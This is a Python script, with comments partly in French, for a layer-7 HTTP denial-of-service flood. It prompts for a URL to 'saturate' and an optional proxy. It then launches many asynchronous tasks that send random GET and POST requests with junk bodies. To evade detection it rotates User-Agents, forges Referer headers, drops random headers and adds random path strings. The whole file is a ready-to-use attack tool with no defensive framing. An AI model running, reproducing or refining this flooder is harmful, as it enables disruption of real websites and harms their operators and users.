import aiohttp
import asyncio
import signal
import time
import random
import string
from aiohttp import ClientTimeout

# URL to DOS
url = input("URL to saturate: ")

# Number of packets per shipment
nombre_threads = int(input("Number of packets per shipment: "))

# Number of shipments to be made
nombre_total_requetes = int(input("Number of shipments to be made: "))

# Proxy usage
proxy = input("Enter an HTTP proxy to use [http://@IP:@PORT] or leave blank: ")
proxy = proxy if "http" in proxy else None

fuzzing = input("Add a random string at the end of each request? [Y/N] (N by default): ")
fuzzing = 1 if fuzzing in ["Y","y"] else 0

print(f"Using {nombre_threads} threads.")
print(f"{(nombre_total_requetes*nombre_threads)*2} requests will be sent")

# Enter a list of user-agents, one at random will be chosen for each request
user_agents = []
file1 = open('user-agent.txt', 'r')
Lines = file1.readlines()

count = 0
# Strips the newline character
for ua in Lines:
    user_agents.append(ua.replace("\n",""))

print("The User-Agents are loaded !")

def generate_payload():
    # Generate heavy load (adjust as needed)
    return ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(0, 500)))

def referer_generator():
    longueur_domaine = random.randint(4,15)
    longueur_chemin = random.randint(4,15)
    caracteres = string.ascii_lowercase + string.digits
    domaine_aleatoire = ''.join(random.choice(caracteres) for _ in range(longueur_domaine))
    chemin_aleatoire = ''.join(random.choice(caracteres) for _ in range(longueur_chemin))
    tlds = ['com', 'net', 'org', 'info', 'ru', 'fr', 'eu', 'net', 'es', 'es', 'site', 'tv', 'af', 'za', 'dz','de', 'ad', 'ao', 'ai', 'ag', 'an', 'sa', 'ar', 'am', 'aw', 'asia', 'au', 'at', 'az', 'bs', 'bh', 'db', 'bb', 'be', 'bz', 'bj', 'bm', 'bt', 'by']
    tld = random.choice(tlds)
    return [f"https://{domaine_aleatoire}.{tld}/{chemin_aleatoire}", f"https://{domaine_aleatoire}.{tld}/"]

accept = ['text/html', 'application/xhtml+xml']
accept_language = ['en-US,en;q=0.9', 'fr-FR,fr;q=0.8']
accept_encoding = ['gzip, deflate, br', 'identity']
referer = referer_generator()

# En-têtes à intégrer dans chaque requête
def get_headers():
    headers = {
        'Accept': random.choice(accept),
        'Accept-Language': random.choice(accept_language),
        'Accept-Encoding': random.choice(accept_encoding),
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'From': referer[1],
        'Referer': referer[0],
        'Content-Type': 'application/x-www-form-urlencoded',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
    }
    keys_to_remove = random.sample(list(headers.keys()), 3)
    # Supprimer ces clés
    for key in keys_to_remove:
        headers.pop(key)
    headers["User-Agent"] = random.choice(user_agents)
    return headers


# Variable to count the number of requests made (shared between threads)
compteur_requetes = asyncio.Queue()

class ProgressIndicator:
    def __init__(self, total):
        self.total = total
        self.current = 0
        self.start_time = time.time()

    def update(self, increment):
        self.current += increment
        self.display()

    def display(self):
        current_time = time.time()
        elapsed_time = current_time - self.start_time
        requests_per_second = self.current / elapsed_time
        print(f"\rNumber of requests sent : {self.current}/{(nombre_total_requetes*nombre_threads)*2} - Number of requests per second : {requests_per_second:.2f}", end="", flush=True)

    def close(self):
        print("\rNumber of requests sent : Done")

async def envoyer_requetes(session, progress_indicator, stop_event):
    global compteur_requetes  # Utilisez la variable globale

    while not stop_event.is_set():
        try: 
            # Send multiple requests in a single iteration
            for _ in range(10):
                method = random.choice(['GET', 'POST'])
                payload = generate_payload()
                nurl = f"{url}{random.choice(string.ascii_lowercase + string.digits)*random.randint(2,12)}" if fuzzing == 1 else url
                async with session.request(method, nurl, headers=get_headers(), data=payload, proxy=proxy, ssl=False) as response:
                    await compteur_requetes.put(1)
                    progress_indicator.update(1)
        except Exception as e:
            pass

async def compteur_total_requetes(progress_indicator, stop_event):
    total_requetes = 0
    while total_requetes < nombre_total_requetes and not stop_event.is_set():
        total_requetes += await compteur_requetes.get()
        progress_indicator.display()  # Show the number of requests per second during each update
        await asyncio.sleep(0.01)  # Adjust if necessary

    stop_event.set()
    progress_indicator.close()

async def main():
    timeout = ClientTimeout(total=10)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        stop_event = asyncio.Event()
        progress_indicator = ProgressIndicator(nombre_total_requetes)
        tasks = [envoyer_requetes(session, progress_indicator, stop_event) for _ in range(nombre_threads)]
        tasks.append(compteur_total_requetes(progress_indicator, stop_event))

        # Run tasks without blocking the main script
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    loop = asyncio.get_event_loop()

    # Gérer les signaux d'arrêt (Ctrl+C)
    stop_event = asyncio.Event()

    def handle_signal(sig, frame):
        print("\nForced shutdown by user. The script ends.")
        stop_event.set()
        exit()

    signal.signal(signal.SIGINT, handle_signal)

    loop.run_until_complete(main())
